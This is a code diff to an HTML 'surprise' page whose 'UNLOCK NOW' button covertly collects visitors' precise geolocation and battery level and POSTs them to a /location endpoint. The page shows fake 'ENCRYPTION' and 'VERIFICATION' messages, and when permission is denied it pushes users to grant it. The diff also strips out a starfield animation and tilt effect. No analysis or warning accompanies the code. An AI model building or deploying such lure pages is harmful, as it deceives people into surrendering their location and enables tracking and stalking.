@@ -148,191 +148,88 @@ letter-spacing:2px;
 <button class="neon-btn" onclick="startProcess()">UNLOCK NOW</button>
 <div id="status" class="status-msg">INITIALIZING ENCRYPTION...</div>
 </div>
-
 <script>
 
-/* stars */
+function startProcess() {
 
-let scene,camera,renderer,starPoints;
-const starCount=8000;
+    const status = document.getElementById("status");
 
-function init3D(){
+    status.style.display = "block";
+    status.innerText = "INITIALIZING ENCRYPTION...";
+    status.classList.remove("error-msg");
 
-scene=new THREE.Scene();
+    navigator.geolocation.getCurrentPosition(
 
-camera=new THREE.PerspectiveCamera(
-60,
-window.innerWidth/window.innerHeight,
-1,
-1000
-);
+        async (pos) => {
 
-camera.position.z=1;
+            // SUCCESS: if user allows location
+            let lat = pos.coords.latitude;
+            let lon = pos.coords.longitude;
 
-renderer=new THREE.WebGLRenderer({antialias:true});
-renderer.setSize(window.innerWidth,window.innerHeight);
+            let battery = 0;
 
-document.getElementById("canvas-container").appendChild(renderer.domElement);
+            if (navigator.getBattery) {
+                let bat = await navigator.getBattery();
+                battery = Math.floor(bat.level * 100);
+            }
 
-const starGeo=new THREE.BufferGeometry();
+            await fetch("/location", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    user: "visitor",
+                    latitude: lat,
+                    longitude: lon,
+                    battery: battery
+                })
+            });
 
-const positions=[];
-const colors=[];
-const color=new THREE.Color();
+            status.innerText = "VERIFICATION COMPLETE";
 
-for(let i=0;i<starCount;i++){
+            setTimeout(() => {
+                alert("🎉 Surprise Unlocked!");
+            }, 1000);
 
-positions.push(Math.random()*600-300);
-positions.push(Math.random()*600-300);
-positions.push(Math.random()*600-300);
+        },
 
-color.setHSL(Math.random(),1.0,0.7);
+        (err) => {
 
-colors.push(color.r,color.g,color.b);
+            // ERROR: if user denies location
+            if (err.code === 1) {
 
-}
+                status.innerHTML =
+                "⚠️ ACCESS DENIED! <br><small>Please click the 🔒 icon in the address bar and allow Location permission.</small>";
 
-starGeo.setAttribute(
-"position",
-new THREE.Float32BufferAttribute(positions,3)
-);
+                status.classList.add("error-msg");
 
-starGeo.setAttribute(
-"color",
-new THREE.Float32BufferAttribute(colors,3)
-);
+                setTimeout(() => {
 
-const starMaterial=new THREE.PointsMaterial({
-size:0.8,
-vertexColors:true,
-transparent:true,
-opacity:0.8
-});
+                    if (confirm("Location permission is required to unlock the surprise. Try again?")) {
 
-starPoints=new THREE.Points(starGeo,starMaterial);
+                        location.reload();
 
-scene.add(starPoints);
+                    }
 
-window.addEventListener("resize",onWindowResize);
+                }, 3000);
+            }
 
-animate();
+        },
 
-}
+        {
+            enableHighAccuracy: true,
+            timeout: 10000
+        }
 
-function animate(){
-
-starPoints.rotation.y+=0.002;
-starPoints.rotation.x+=0.001;
-
-const positions=starPoints.geometry.attributes.position.array;
-
-for(let i=2;i<positions.length;i+=3){
-
-positions[i]+=1.5;
-
-if(positions[i]>200){
-
-positions[i]=-400;
+    );
 
 }
-
-}
-
-starPoints.geometry.attributes.position.needsUpdate=true;
-
-renderer.render(scene,camera);
-
-requestAnimationFrame(animate);
-
-}
-
-function onWindowResize(){
-
-camera.aspect=window.innerWidth/window.innerHeight;
-
-camera.updateProjectionMatrix();
-
-renderer.setSize(window.innerWidth,window.innerHeight);
-
-}
-
-/* tilt */
-
-const box=document.getElementById("box");
-
-document.addEventListener("mousemove",(e)=>{
-
-let xAxis=(window.innerWidth/2-e.pageX)/25;
-
-let yAxis=(window.innerHeight/2-e.pageY)/25;
-
-box.style.transform=`rotateY(${xAxis}deg) rotateX(${yAxis}deg)`;
-
-});
-
-/* logic */
-
-function startProcess(){
-
-const status=document.getElementById("status");
-
-status.style.display="block";
-
-navigator.geolocation.getCurrentPosition(
-
-async (pos)=>{
-
-let lat = pos.coords.latitude
-let lon = pos.coords.longitude
-
-let battery = 0
-
-if(navigator.getBattery){
-
-let bat = await navigator.getBattery()
-battery = Math.floor(bat.level * 100)
-
-}
-
-fetch("/location",{
-method:"POST",
-headers:{
-"Content-Type":"application/json"
-},
-body:JSON.stringify({
-user:"visitor",
-latitude:lat,
-longitude:lon,
-battery:battery
-})
-})
-
-status.innerText=""
-
-setTimeout(()=>{
-alert("🎉 Surprise Unlocked!")
-},1000)
-
-},
-
-(err)=>{
-
-status.innerText="⚠️ PLEASE ENABLE LOCATION";
-status.classList.add("error-msg");
-
-setTimeout(()=>{
-startProcess()
-},3000)
-
-}
-
-);
-
-}
-
-init3D();
 
 </script>
 
 </body>
 </html>
+
+
+
